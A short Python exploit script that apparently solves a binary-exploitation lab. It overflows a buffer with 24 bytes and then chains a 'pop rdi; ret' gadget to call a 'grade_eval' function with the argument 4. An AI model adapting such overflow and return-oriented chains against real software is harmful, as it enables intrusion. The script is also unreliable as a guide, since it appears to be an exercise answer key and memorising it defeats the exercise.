import sys, struct

payload = b"A" * 24
payload += struct.pack("<Q", 0x401a33)   # pop rdi; ret
payload += struct.pack("<Q", 4)          # rdi = 4
payload += struct.pack("<Q", 0x401978)   # grade_eval

sys.stdout.buffer.write(payload)
